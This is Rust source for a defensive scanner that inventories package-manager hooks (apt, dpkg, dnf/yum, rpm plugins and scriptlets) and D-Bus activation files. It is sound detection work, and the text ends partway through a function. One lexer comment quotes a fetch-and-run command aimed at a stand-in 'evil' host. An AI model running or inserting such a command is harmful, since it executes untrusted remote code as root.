//! Package-manager hooks and D-Bus activation.
//!
//! One collector, because the two share an audience rather than a format:
//! both are mechanisms where somebody else's daemon runs a command line on
//! your behalf, at a moment no human chose. A package hook runs as root every
//! time anything is installed or updated — which on an unattended-upgrades
//! host is daily — and a D-Bus service file lets any process that can reach
//! the bus start a named program by asking for its name.
//!
//! The rpm half has two sources, because rpm keeps its hooks in two places.
//! Configuration under /etc and /usr/lib/rpm wires up transaction *plugins*;
//! the `%pre`/`%post` scriptlets and the `%filetrigger*`/`%transfiletrigger*`
//! scripts live in the package headers inside the rpmdb, where no file names
//! them. Both run as root on a package operation, so both are read — the
//! second through the header parser §7's provenance backend already owns.

use std::collections::{BTreeMap, BTreeSet};
use std::ffi::{OsStr, OsString};
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, hex, name_from_os};
use crate::scan::{Collector, Ctx};

pub struct PkgHooks;

impl Collector for PkgHooks {
    fn name(&self) -> &'static str {
        "pkg"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = apt(cx);
        out.extend(dpkg_scripts(cx));
        out.extend(dnf_plugins(cx));
        out.extend(rpm(cx));
        out.extend(dbus(cx));
        out
    }
}

/// D-Bus policy files are XML and a large one is still only a few kilobytes;
/// anything past this is not a policy an operator needs quoted back.
const POLICY_CAP: usize = 256 * 1024;
const TRIGGERS_CAP: usize = 64 * 1024;

// ------------------------------------------------------------------- apt ----

const APT_CONF: &str = "etc/apt/apt.conf";
const APT_CONF_D: &str = "etc/apt/apt.conf.d";

/// The apt configuration keys whose value apt hands to /bin/sh. Matched
/// against the canonical lower-case key after any `Binary::<program>::`
/// prefix is stripped, since a hook may be scoped to one front-end.
///
/// Nothing else under apt.conf.d executes. `Dir::`, `Acquire::` and the
/// `APT::Get` options change behaviour but never spawn anything, and
/// `etc/apt/preferences.d` is pin priorities only — no key in it runs a
/// command, so no entry is emitted for it.
const HOOK_KEYS: &[&str] = &[
    "dpkg::pre-invoke",
    "dpkg::post-invoke",
    "dpkg::post-invoke-success",
    "dpkg::pre-install-pkgs",
    "apt::update::pre-invoke",
    "apt::update::post-invoke",
    "apt::update::post-invoke-success",
    "apt::update::post-invoke-stats",
];

fn apt(cx: &mut Ctx) -> Vec<Entry> {
    let mut files: Vec<(PathBuf, Option<String>)> = vec![(PathBuf::from(APT_CONF), None)];
    for ent in cx.dir(APT_CONF_D) {
        if ent.is_dir {
            continue;
        }
        files.push((Path::new(APT_CONF_D).join(&ent.name), apt_skips(&ent.name)));
    }

    let mut out = Vec::new();
    for (rel, skipped) in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        let mut used: BTreeMap<String, usize> = BTreeMap::new();
        for (key, value) in apt_conf_pairs(&bytes) {
            let Some((binary, canon)) = hook_of(&key) else { continue };
            let name = uniq(&mut used, format!("{canon}:{}", short_hash(&value)));
            let mut e = cx.entry(Kind::PkgHook, &rel, name);
            e.trigger = Trigger::PackageOp;
            // apt and dpkg run as root, and so does everything they invoke.
            e.principal = Some("root".to_string());
            e.enabled = match &skipped {
                Some(_) => Enablement::Disabled,
                None => Enablement::Enabled,
            };
            e.note("manager", "apt");
            // The canonical key, not the spelling in the file: apt accepts the
            // same hook written as a nested block or flattened with `::`, and
            // two spellings of one hook must not diff as two entries.
            e.note("key", canon);
            if let Some(b) = binary {
                e.note("front_end", b);
            }
            if let Some(why) = &skipped {
                e.note("not_read_by_apt", why.clone());
            }
            set_command(&mut e, &value);
            out.push(e);
        }
    }
    out
}

/// apt.conf(5): a fragment in apt.conf.d is read only if its name holds
/// nothing but alphanumerics, hyphen, underscore and period, and it has no
/// extension or the extension `.conf`. A file apt ignores is still evidence —
/// it is reported, as Disabled, because nothing runs it.
fn apt_skips(name: &OsStr) -> Option<String> {
    let bytes = name.as_bytes();
    if !bytes
        .iter()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'-' | b'_' | b'.'))
    {
        return Some("name holds a character apt.conf.d does not accept".to_string());
    }
    match lossy(bytes).rsplit_once('.') {
        Some((_, ext)) if ext != "conf" => {
            Some(format!("apt reads no extension or .conf, this is .{ext}"))
        }
        _ => None,
    }
}

/// `Binary::apt-get::DPkg::Post-Invoke` scopes a hook to one front-end;
/// everything after the program name is an ordinary key.
fn hook_of(key: &str) -> Option<(Option<String>, String)> {
    let lower = key.to_ascii_lowercase();
    let mut parts: Vec<&str> = lower.split("::").filter(|s| !s.is_empty()).collect();
    let mut binary = None;
    if parts.len() > 2 && parts[0] == "binary" {
        binary = Some(parts[1].to_string());
        parts.drain(..2);
    }
    let canon = parts.join("::");
    HOOK_KEYS.contains(&canon.as_str()).then_some((binary, canon))
}

enum Tok {
    Word(Vec<u8>),
    Open,
    Close,
    Semi,
}

/// The apt.conf lexer. Comments are stripped here and only here, and only
/// outside a quoted string: `"curl http://evil/x | sh"` is a command with a
/// `//` in it, not a command followed by a comment, and truncating there
/// would hide the half that matters.
///
/// Every branch advances the cursor, so no input loops. The token vector is
/// bounded by the read cap: one token per byte is the worst case.
fn apt_tokens(bytes: &[u8]) -> Vec<Tok> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        match b {
            b'"' => {
                i += 1;
                let start = i;
                // apt has no escape inside a quoted string: the next quote
                // ends it, whatever precedes it.
                while i < bytes.len() && bytes[i] != b'"' {
                    i += 1;
                }
                out.push(Tok::Word(bytes[start..i].to_vec()));
                if i < bytes.len() {
                    i += 1;
                }
            }
            b'/' if bytes.get(i + 1) == Some(&b'/') => {
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'/' if bytes.get(i + 1) == Some(&b'*') => {
                i += 2;
                while i < bytes.len() && !(bytes[i] == b'*' && bytes.get(i + 1) == Some(&b'/')) {
                    i += 1;
                }
                i = (i + 2).min(bytes.len());
            }
            // `#clear` and `#include` are directives rather than settings.
            // Neither executes anything; both are skipped to end of line so a
            // path inside one cannot be mistaken for a hook.
            b'#' => {
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'{' => {
                out.push(Tok::Open);
                i += 1;
            }
            b'}' => {
                out.push(Tok::Close);
                i += 1;
            }
            b';' => {
                out.push(Tok::Semi);
                i += 1;
            }
            _ if b.is_ascii_whitespace() => i += 1,
            _ => {
                let start = i;
                while i < bytes.len()
                    && !bytes[i].is_ascii_whitespace()
                    && !matches!(bytes[i], b'{' | b'}' | b';' | b'"' | b'#')
                {
                    i += 1;
                }
                out.push(Tok::Word(bytes[start..i].to_vec()));
            }
        }
    }
    out
}

/// Flattens an apt.conf into `(key, value)` pairs, where the key is the full
/// `::`-joined path to the value.
///
/// The two spellings apt accepts collapse here:
/// `DPkg { Post-Invoke { "cmd"; }; };` and `DPkg::Post-Invoke {"cmd";};`
/// both yield `("DPkg::Post-Invoke", "cmd")`. A stray `}` pops nothing rather
/// than failing, and a `{` never closed simply leaves the stack deep — an
/// unbalanced file yields whatever it can, because a file apt itself would
/// reject is still evidence of what someone tried to install.
fn apt_conf_pairs(bytes: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut out = Vec::new();
    let mut stack: Vec<String> = Vec::new();
    let mut tag: Option<Vec<u8>> = None;
    for tok in apt_tokens(bytes) {
        match tok {
            Tok::Word(w) => match tag.take() {
                // `Tag "value"` — the pair is complete.
                Some(t) => out.push((key_of(&stack, Some(&t)), w)),
                None => tag = Some(w),
            },
            Tok::Open => {
                let scope = tag.take().map(|t| lossy(&t)).unwrap_or_default();
                stack.push(scope);
            }
            // A lone string ended by `;` or `}` is a list element, and its key
            // is the block that holds it.
            Tok::Close => {
                if let Some(t) = tag.take() {
                    out.push((key_of(&stack, None), t));
                }
                stack.pop();
            }
            Tok::Semi => {
                if let Some(t) = tag.take() {
                    out.push((key_of(&stack, None), t));
                }
            }
        }
    }
    out
}

fn key_of(stack: &[String], tag: Option<&[u8]>) -> String {
    let mut joined = stack.join("::");
    if let Some(t) = tag {
        joined.push_str("::");
        joined.push_str(&lossy(t));
    }
    joined.split("::").filter(|s| !s.is_empty()).collect::<Vec<_>>().join("::")
}

// ------------------------------------------------------------------ dpkg ----

const DPKG_INFO: &str = "var/lib/dpkg/info";

/// The maintainer scripts dpkg runs around a package operation. `.config` is
/// debconf's and runs too, but only under debconf's own frontend; it is left
/// to the enrichment pass rather than guessed at here.
const MAINTAINER_SCRIPTS: &[&str] = &["preinst", "postinst", "prerm", "postrm"];

/// Every maintainer script on the host, several hundred of them, all packaged.
/// They are emitted rather than filtered because the filter belongs downstream:
/// §8 suppresses a packaged, intact script by default, and a script that is
/// *not* packaged or not intact in this directory is one of the loudest
/// findings the tool can produce. Filtering here would delete that signal.
/// How long after a package's file list is written its maintainer scripts
/// may still be landing. dpkg writes the `.list` and then installs the new
/// control files in the same unpack, moments apart; a restore or an image
/// layer extracted in bulk spreads them by seconds. A script whose inode
/// changed later than this was changed after its package was installed.
const INSTALL_WINDOW: std::time::Duration = std::time::Duration::from_secs(120);

/// No digest exists for a maintainer script, so its contents cannot be
/// checked — but when it changed can be. dpkg writes `<pkg>.list` and the
/// package's scripts in one unpack, and an inode's change time cannot be set
/// from userspace. A script whose ctime is well after its package's list was
/// edited or planted since, by something other than dpkg.
///
/// On an image copied rather than mounted the ctimes are the copy's, and the
/// comparison says nothing; it only ever adds a note, never takes one away.
fn note_changed_after_install(cx: &Ctx, e: &mut Entry, rel: &Path, stem: &[u8]) {
    let mut list = stem.to_vec();
    list.extend_from_slice(b".list");
    let list_rel = Path::new(DPKG_INFO).join(OsStr::from_bytes(&list));
    let (Ok(script), Ok(list)) = (cx.root.stat(rel), cx.root.stat(&list_rel)) else { return };
    let (Some(changed), Some(installed)) = (script.ctime, list.ctime) else { return };
    if let Some(after) = changed_after_install(changed, installed) {
        e.note(
            "changed_after_install",
            format!("inode changed {}s after {} was written", after.as_secs(), cx.root.abs(&list_rel).display()),
        );
    }
}

fn changed_after_install(script: std::time::SystemTime, list: std::time::SystemTime) -> Option<std::time::Duration> {
    script.duration_since(list).ok().filter(|after| *after > INSTALL_WINDOW)
}

fn dpkg_scripts(cx: &mut Ctx) -> Vec<Entry> {
    let listing = cx.dir(DPKG_INFO);
    let with_triggers: BTreeSet<Vec<u8>> = listing
        .iter()
        .filter_map(|ent| ent.name.as_bytes().strip_suffix(b".triggers").map(<[u8]>::to_vec))
        .collect();

    let mut out = Vec::new();
    for ent in &listing {
        if ent.is_dir {
            continue;
        }
        let bytes = ent.name.as_bytes();
        let Some(dot) = bytes.iter().rposition(|b| *b == b'.') else { continue };
        let (stem, ext) = (&bytes[..dot], &bytes[dot + 1..]);
        if !MAINTAINER_SCRIPTS.contains(&lossy(ext).as_str()) {
            continue;
        }

        let rel = Path::new(DPKG_INFO).join(&ent.name);
        let script = lossy(ext);
        let mut e = cx.entry(Kind::PkgHook, &rel, format!("{}:{script}", lossy(stem)));
        name_from_os(&mut e, &ent.name);
        e.trigger = Trigger::PackageOp;
        e.principal = Some("root".to_string());
        e.enabled = Enablement::Enabled;
        // The script is its own command line — dpkg execs the file. There is
        // no command string to quote, and the enrichment pass hashes and
        // attributes the target.
        e.target_path = Some(cx.root.abs(&rel));
        e.note("manager", "dpkg");
        e.note("script", script.clone());
        // dpkg records digests for the files a package ships, never for its
        // own metadata, so no scan can ever verify a maintainer script
        // against anything. That is a property of the ecosystem rather than a
        // gap in this run, and the renderer needs to know the difference.
        e.note("digest_unavailable", "dpkg keeps no digest for maintainer scripts");
        note_changed_after_install(cx, &mut e, &rel, stem);
        match lossy(stem).split_once(':') {
            Some((pkg, arch)) => {
                e.note("package", pkg.to_string());
                e.note("arch", arch.to_string());
            }
            None => e.note("package", lossy(stem)),
        }

        // A file trigger is why a postinst runs when no human installed
        // anything: dpkg re-runs it whenever another package touches a watched
        // path. Without this the entry looks like it only fires at install.
        if script == "postinst" && with_triggers.contains(stem) {
            let mut triggers = OsString::from(OsStr::from_bytes(stem));
            triggers.push(".triggers");
            let trel = Path::new(DPKG_INFO).join(&triggers);
            if let Some(bytes) = cx.read_capped(&trel, TRIGGERS_CAP) {
                let interests: Vec<String> = bytes
                    .split(|b| *b == b'\n')
                    .map(<[u8]>::trim_ascii)
                    .filter(|l| !l.is_empty() && l[0] != b'#')
                    .map(lossy)
                    .collect();
                if !interests.is_empty() {
                    e.note("triggers", interests.join("; "));
                }
            }
        }
        out.push(e);
    }
    out
}

// -------------------------------------------------------------- dnf, yum ----

/// Plugin configuration directory, the manager that reads it, and where that
/// manager's global switch lives.
const PLUGIN_DIRS: &[(&str, &str, &str)] = &[
    ("etc/dnf/plugins", "dnf", "etc/dnf/dnf.conf"),
    // dnf5 is the default on current Fedora and keeps its plugin settings
    // somewhere else; its plugins are shared objects rather than python.
    ("etc/dnf/dnf5-plugins", "dnf5", "etc/dnf/dnf.conf"),
    ("etc/yum/pluginconf.d", "yum", "etc/yum.conf"),
];

fn dnf_plugins(cx: &mut Ctx) -> Vec<Entry> {
    // etc/dnf/protected.d holds package names that may not be removed. It
    // executes nothing and gets no entries.
    //
    // The interpreter directories are read only once a plugin needs looking
    // up: on a host with no dnf at all this collector never touches /usr/lib.
    let mut pythons: Option<Vec<PathBuf>> = None;
    let mut out = Vec::new();
    for (dir, manager, global) in PLUGIN_DIRS {
        let entries = cx.dir(dir);
        if entries.is_empty() {
            continue;
        }
        let plugins_off = cx
            .read(global)
            .and_then(|b| ini_lookup(&b, "main", "plugins"))
            .and_then(|v| as_bool(&v))
            == Some(false);

        for ent in entries {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".conf") {
                continue;
            }
            let rel = Path::new(dir).join(&ent.name);
            let plugin = lossy(&ent.name.as_bytes()[..ent.name.as_bytes().len() - 5]);
            let Some(bytes) = cx.read(&rel) else { continue };

            let mut e = cx.entry(Kind::PkgHook, &rel, format!("{manager}-plugin:{plugin}"));
            name_from_os(&mut e, &ent.name);
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.note("manager", *manager);
            e.note("plugin", plugin.clone());

            let enabled = ini_lookup(&bytes, "main", "enabled");
            match enabled.as_deref().and_then(as_bool) {
                Some(true) => e.enabled = Enablement::Enabled,
                Some(false) => e.enabled = Enablement::Disabled,
                None => {
                    e.enabled = Enablement::Unknown;
                    e.flag(Flag::DegradedEnablement);
                    e.note(
                        "enablement",
                        match enabled {
                            Some(v) => format!("enabled={v} is not a boolean {manager} accepts"),
                            None => format!("no enabled= key; the {manager} default applies"),
                        },
                    );
                }
            }
            if plugins_off {
                e.enabled = Enablement::Disabled;
                e.note("enablement", format!("plugins=0 in {global} disables every plugin"));
            }

            // The plugin's code is loaded by the manager itself, from a path
            // the manager decides. It is recorded so the provenance pass can
            // attribute and hash it; nothing it imports is walked.
            if pythons.is_none() {
                pythons = Some(python_dirs(cx));
            }
            match plugin_code(cx, pythons.as_deref().unwrap_or(&[]), manager, &plugin) {
                Some(path) => e.target_path = Some(cx.root.abs(&path)),
                None => e.note("code", format!("no {plugin} module on the {manager} plugin path")),
            }
            out.push(e);
        }
    }
    out
}

/// The python installations a plugin's module could live under. One directory
/// read, no traversal: the interpreter's whole site-packages tree is none of
/// this collector's business.
fn python_dirs(cx: &mut Ctx) -> Vec<PathBuf> {
    let mut out = Vec::new();
    for lib in distinct_dirs(cx, &["usr/lib", "usr/lib64", "lib", "lib64"]) {
        for ent in cx.dir(lib) {
            if ent.name.as_bytes().starts_with(b"python3") {
                out.push(Path::new(lib).join(&ent.name));
            }
        }
    }
    out
}

fn plugin_code(cx: &Ctx, pythons: &[PathBuf], manager: &str, plugin: &str) -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();
    match manager {
        "dnf5" => {
            for lib in ["usr/lib64", "usr/lib"] {
                candidates.push(PathBuf::from(format!("{lib}/dnf5/plugins/{plugin}.so")));
            }
        }
        "yum" => {
            for lib in ["usr/share", "usr/lib"] {
                candidates.push(PathBuf::from(format!("{lib}/yum-plugins/{plugin}.py")));
            }
        }
        _ => {}
    }
    candidates.extend(
        pythons.iter().map(|p| p.join("site-packages/dnf-plugins").join(format!("{plugin}.py"))),
    );
    candidates.into_iter().find(|c| cx.root.stat(c).is_ok())
}

// ------------------------------------------------------------------- rpm ----

/// What an rpm transaction plugin is: a shared object rpm dlopen()s for every
/// transaction, wired up by a `%__transaction_<name>` macro. Defining the
/// macro empty is how rpm turns one off.
fn rpm(cx: &mut Ctx) -> Vec<Entry> {
    let (mut out, caveat) = rpm_scriptlets(cx);
    let mut files: Vec<PathBuf> = Vec::new();
    for dir in distinct_dirs(cx, &["usr/lib/rpm", "lib/rpm"]) {
        files.push(Path::new(dir).join("macros"));
        for ent in cx.dir(Path::new(dir).join("macros.d")) {
            if !ent.is_dir {
                files.push(Path::new(dir).join("macros.d").join(&ent.name));
            }
        }
    }
    for ent in cx.dir("etc/rpm") {
        if !ent.is_dir && ent.name.as_bytes().starts_with(b"macros") {
            files.push(Path::new("etc/rpm").join(&ent.name));
        }
    }

    let mut referenced: BTreeSet<String> = BTreeSet::new();
    for rel in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        let mut used: BTreeMap<String, usize> = BTreeMap::new();
        for line in macro_lines(&bytes) {
            let Some(rest) = line.strip_prefix(b"%") else { continue };
            let split = rest
                .iter()
                .position(|b| b.is_ascii_whitespace() || *b == b'(')
                .unwrap_or(rest.len());
            let (macro_name, body) = rest.split_at(split);
            if !macro_name.starts_with(b"__transaction_") {
                continue;
            }
            let body = body.trim_ascii();
            if let Some(so) = shared_object_name(body) {
                referenced.insert(so);
            }

            let macro_name = lossy(macro_name);
            let name = uniq(&mut used, macro_name.clone());
            let mut e = cx.entry(Kind::PkgHook, &rel, name);
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.note("manager", "rpm");
            e.note("macro", format!("%{macro_name}"));

            // Not every `%__transaction_*` macro wires up a plugin. The
            // unshare plugin's own settings — `%__transaction_unshare_paths
            // /tmp:/home` — share the prefix and load nothing, so they are
            // reported as the settings they are rather than as code that runs.
            let off = body.is_empty() || body == b"%{nil}" || body == b"%nil";
            if off || names_shared_object(body) {
                e.note("role", "plugin");
                // rpm turns a transaction plugin off by defining its macro
                // empty, which is why an empty body is not a missing value.
                e.enabled = if off { Enablement::Disabled } else { Enablement::Enabled };
                set_command(&mut e, body);
                // `%{__plugindir}/audit.so` resolves only through rpm's own
                // macro table, which is not expanded here. The object's name
                // is the join to the entry made from the plugin directory.
                if let Some(so) = shared_object_name(body) {
                    e.note("plugin", so);
                }
            } else {
                e.note("role", "plugin setting");
                e.note("value", lossy(body));
                e.enabled = Enablement::NotApplicable;
            }
            e.note("caveat", caveat);
            out.push(e);
        }
    }

    for dir in distinct_dirs(cx, &["usr/lib/rpm/plugins", "lib/rpm/plugins", "usr/lib/rpm", "lib/rpm"])
    {
        for ent in cx.dir(dir) {
            if ent.is_dir || !ent.name.as_bytes().ends_with(b".so") {
                continue;
            }
            let rel = Path::new(dir).join(&ent.name);
            let file = lossy(ent.name.as_bytes());
            let mut e = cx.entry(Kind::PkgHook, &rel, format!("plugin:{file}"));
            name_from_os(&mut e, &ent.name);
            e.trigger = Trigger::PackageOp;
            e.principal = Some("root".to_string());
            e.target_path = Some(cx.root.abs(&rel));
            e.note("manager", "rpm");
            e.note("plugin", file.clone());
            if referenced.contains(&file) {
                e.enabled = Enablement::Enabled;
                e.note("wired_by", "a %__transaction_* macro names this object");
            } else {
                // rpm's default macro set may name it in a file this collector
                // did not read, so absence of a reference is not proof.
                e.enabled = Enablement::Unknown;
                e.flag(Flag::DegradedEnablement);
                e.note("wired_by", "no %__transaction_* macro read here names this object");
            }
            e.note("caveat", caveat);
            out.push(e);
        }
    }
    out
}

/// Stated on every rpm configuration entry rather than in a README, because
/// the operator reading the JSON is the one who needs to know the limit of
/// what they are looking at.
const RPM_CAVEAT: &str = "configuration shows transaction plugins only; the \
     scriptlets and file triggers rpm keeps in its package headers are read \
     from the rpmdb and reported as their own entries";

/// The same limit where no database was readable, in which case the scriptlet
/// half of the answer is genuinely missing rather than elsewhere.
const RPM_NO_DB: &str = "configuration shows transaction plugins only; no rpmdb \
     could be read on this root, so the %pre/%post scriptlets and \
     %filetrigger/%transfiletrigger scripts it holds are not reported";

/// The scriptlets and triggers rpm keeps in its package headers. A `%post`
/// runs as root on every transaction of its own package, a
/// `%transfiletriggerin -- /usr/bin` runs as root whenever *anything* is
/// installed into /usr/bin, and no file under /etc or /usr/lib/rpm names
/// either of them.
///
/// Every one found is emitted. Which of them is interesting is a judgement
/// this tool does not make (§8), and the volume is bounded by how few
/// packages carry a scriptlet at all — roughly one entry per three installed
/// packages: 47 on a stock Fedora 44 container of 147 packages, 141 on one of
/// 475 with the development tools.
fn rpm_scriptlets(cx: &mut Ctx) -> (Vec<Entry>, &'static str) {
    let Some((db, scriptlets)) = crate::provenance::rpm::scriptlets(cx.root) else {
        return (Vec::new(), RPM_NO_DB);
    };

    let mut used: BTreeMap<String, usize> = BTreeMap::new();
    let mut out = Vec::new();
    for s in scriptlets {
        let pkg = match s.arch.is_empty() {
            true => s.package.clone(),
            false => format!("{}.{}", s.package, s.arch),
        };
        // Position in the header identifies nothing: a package holds several
        // triggers of one type, and one added above the others must not
        // re-identify them. What identifies a trigger is what fires it, so
        // that is what the name is built from — never the body, which must be
        // free to change without the entry becoming a different entry.
        let name = match s.fires_on.is_empty() {
            true => format!("{pkg}:{}", s.kind),
            false => {
                let fires = format!("{}\n{:?}", s.fires_on.join("\n"), s.priority);
                format!("{pkg}:{}:{}", s.kind, short_hash(fires.as_bytes()))
            }
        };

        let mut e = cx.entry(Kind::PkgHook, db, uniq(&mut used, name));
        e.trigger = Trigger::PackageOp;
        e.principal = Some("root".to_string());
        e.enabled = Enablement::Enabled;
        e.note("manager", "rpm");
        e.note("package", s.package.clone());
        e.note("version", s.version.clone());
        e.note("scriptlet", s.kind.clone());
        if !s.prog.is_empty() {
            e.note("interpreter", s.prog.clone());
        }
        // The source is a database file, and an operator who sees one has to
        // know the entry is a field inside it rather than the file itself.
        e.note("read_from", "rpm package header");
        if !s.fires_on.is_empty() {
            e.note("fires_on", s.fires_on.join(", "));
        }
        if let Some(p) = s.priority {
            e.note("priority", p.to_string());
        }
        if s.truncated {
            e.note("body_truncated", "the scriptlet is longer than the read cap");
        }
        set_command(&mut e, &s.body);
        // A scriptlet is a program, not a command line: the first absolute
        // path in the body is as likely to be an argument or a comment as the
        // thing that runs. What rpm execs is the interpreter.
        e.target_path = first_absolute(s.prog.as_bytes());
        // `<lua>` names no file: rpm runs the body in an interpreter built
        // into itself. Saying so is what keeps every lua scriptlet on the
        // host from being reported as a command whose program went missing.
        if s.prog == "<lua>" || s.prog.is_empty() {
            e.note("target_unverifiable", "rpm runs this itself; no program is named");
        }
        out.push(e);
    }
    (out, RPM_CAVEAT)
}

/// Does this macro body name something rpm could dlopen? The extension is the
/// only signal available before the transaction runs: rpm finds its plugins by
/// looking for shared objects, and the macro says which one and with what.
fn names_shared_object(body: &[u8]) -> bool {
    shared_object_name(body).is_some()
}

fn shared_object_name(body: &[u8]) -> Option<String> {
    body.split(|b: &u8| b.is_ascii_whitespace())
        .find(|w| w.ends_with(b".so"))
        .and_then(|w| w.rsplit(|b| *b == b'/').next())
        .map(lossy)
}

/// rpm macro definitions, joined on a trailing backslash, comments dropped.
fn macro_lines(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out = Vec::new();
    let mut current: Vec<u8> = Vec::new();
    let mut continued = false;
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.strip_suffix(b"\r").unwrap_or(raw);
        let more = line.last() == Some(&b'\\');
        let body = if more { &line[..line.len() - 1] } else { line };
        if !continued && (body.trim_ascii_start().is_empty() || body.trim_ascii_start()[0] == b'#')
        {
            continued = more;
            continue;
        }
        if continued {
            current.push(b' ');
        }
        current.extend_from_slice(body.trim_ascii());
        continued = more;
        if !continued && !current.is_empty() {
            out.push(std::mem::take(&mut current));
        }
    }
    if !current.is_empty() {
        out.push(current);
    }
    out
}

// ------------------------------------------------------------------ D-Bus ----

const SYSTEM_SERVICE_DIRS: &[&str] = &[
    "usr/share/dbus-1/system-services",
    "usr/local/share/dbus-1/system-services",
    "usr/lib/dbus-1/system-services",
    "lib/dbus-1/system-services",
    "run/dbus-1/system-services",
    "etc/dbus-1/system-services",
];

const SESSION_SERVICE_DIRS: &[&str] = &[
    "usr/share/dbus-1/services",
    "usr/local/share/dbus-1/services",
    "usr/lib/dbus-1/services",
    "lib/dbus-1/services",
    "run/dbus-1/services",
    "etc/dbus-1/services",
];

/// Access policy, not activation. Nothing here executes, so nothing here gets
/// an entry; what it is good for is telling the operator who may reach the
/// service that does execute.
const POLICY_DIRS: &[&str] = &[
    "etc/dbus-1/system.d",
    "usr/share/dbus-1/system.d",
    "usr/local/share/dbus-1/system.d",
    "usr/lib/dbus-1/system.d",
    "lib/dbus-1/system.d",
    "run/dbus-1/system.d",
    "etc/dbus-1/session.d",
    "usr/share/dbus-1/session.d",
    "usr/local/share/dbus-1/session.d",
    "usr/lib/dbus-1/session.d",
    "lib/dbus-1/session.d",
];

fn dbus(cx: &mut Ctx) -> Vec<Entry> {
    let policies = dbus_policies(cx);
    let mut out = Vec::new();

    for dir in distinct_dirs(cx, SYSTEM_SERVICE_DIRS) {
        out.extend(service_dir(cx, Path::new(dir).to_path_buf(), "system", None, &policies));
    }
    for dir in distinct_dirs(cx, SESSION_SERVICE_DIRS) {
        out.extend(service_dir(cx, Path::new(dir).to_path_buf(), "session", None, &policies));
    }

    // A user's own session services are the interesting half: the directory is
    // writable without root, and anything on the session bus can activate what
    // is in it.
    let users = cx.users;
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    for u in users {
        let dir = u.in_home(".local/share/dbus-1/services");
        if !seen.insert(dir.clone()) {
            continue;
        }
        out.extend(service_dir(cx, dir, "session", Some(u.name.as_str()), &policies));
    }
    out
}

fn service_dir(
    cx: &mut Ctx,
    dir: PathBuf,
    bus: &str,
    principal: Option<&str>,
    policies: &BTreeMap<String, Vec<String>>,
) -> Vec<Entry> {
    let mut out = Vec::new();
    for ent in cx.dir(&dir) {
        if ent.is_dir || !ent.name.as_bytes().ends_with(b".service") {
            continue;
        }
        let rel = dir.join(&ent.name);
        let Some(bytes) = cx.read(&rel) else { continue };
        out.push(service_file(cx, &rel, &ent.name, &bytes, bus, principal, policies));
    }
    out
}

fn service_file(
    cx: &mut Ctx,
    rel: &Path,
    file: &OsStr,
    bytes: &[u8],
    bus: &str,
    principal: Option<&str>,
    policies: &BTreeMap<String, Vec<String>>,
) -> Entry {
    // The file name, not the Name= key, is the identity: a bus name edited in
    // place must diff as a changed entry, not as one removed and one added.
    let mut e = cx.entry(Kind::DbusService, rel, lossy(file.as_bytes()));
    name_from_os(&mut e, file);
    // Activation is on demand and unscheduled: any caller that asks the bus
    // for the name starts it, at any moment.
    e.trigger = Trigger::Always;
    e.principal = principal.map(str::to_string);
    e.note("bus", bus);

    let pairs = service_group(bytes);
    if pairs.is_empty() {
        e.note("parse", "no [D-BUS Service] group, or it is empty");
    }

    let mut exec: Option<Vec<u8>> = None;
    let mut bus_name: Option<String> = None;
    let mut systemd = false;
    for (key, value) in pairs {
        match key.as_str() {
            "Exec" => exec = Some(value),
            "Name" => {
                bus_name = Some(lossy(&value));
                e.note("bus_name", lossy(&value));
            }
            // The bus activates as this user, whatever started the caller.
            "User" => e.principal = Some(lossy(&value)),
            "SystemdService" => {
                systemd = true;
                // Recorded so an operator can join this entry to the systemd
                // collector's entry for the same unit: with this key present,
                // the bus hands activation to systemd and the unit runs even
                // though nothing enabled it.
                e.note("systemd_service", lossy(&value));
            }
            _ => e.note(&format!("dbus.{key}"), lossy(&value)),
        }
    }

    match &exec {
        Some(cmd) => set_command(&mut e, cmd),
        None => {
            e.note("exec", "no Exec= key");
        }
    }
    e.enabled = if exec.is_some() || systemd {
        Enablement::Enabled
    } else {
        Enablement::NotApplicable
    };

    let stem = lossy(file.as_bytes().strip_suffix(b".service").unwrap_or(file.as_bytes()));
    let mut matched: Vec<String> = Vec::new();
    for key in [bus_name.as_deref(), Some(stem.as_str())].into_iter().flatten() {
        if let Some(files) = policies.get(key) {
            matched.extend(files.iter().cloned());
        }
    }
    matched.sort();
    matched.dedup();
    if !matched.is_empty() {
        e.note("policy_files", matched.join(", "));
    }
    e
}

/// The `[D-BUS Service]` group of a freedesktop key file.
fn service_group(bytes: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut out = Vec::new();
    let mut inside = false;
    for line in bytes.split(|b| *b == b'\n') {
        let line = line.trim_ascii();
        if line.is_empty() || line[0] == b'#' {
            continue;
        }
        if line[0] == b'[' {
            let group = line.strip_prefix(b"[").and_then(|l| l.strip_suffix(b"]")).unwrap_or(line);
            inside = lossy(group).eq_ignore_ascii_case("D-BUS Service");
            continue;
        }
        if !inside {
            continue;
        }
        let Some(eq) = line.iter().position(|b| *b == b'=') else { continue };
        let key = lossy(line[..eq].trim_ascii());
        if key.is_empty() {
            continue;
        }
        out.push((key, line[eq + 1..].trim_ascii().to_vec()));
    }
    out
}

/// Bus name to the policy files that mention it. Read as bytes and scanned for
/// the two attributes that name a service, rather than parsed as XML: the
/// answer wanted is "which file governs this name", and a policy file that no
/// XML parser would accept still tells us that.
fn dbus_policies(cx: &mut Ctx) -> BTreeMap<String, Vec<String>> {
    let mut out: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for dir in distinct_dirs(cx, POLICY_DIRS) {
        for ent in cx.dir(dir) {
            if ent.is_dir {
                continue;
            }
            let rel = Path::new(dir).join(&ent.name);
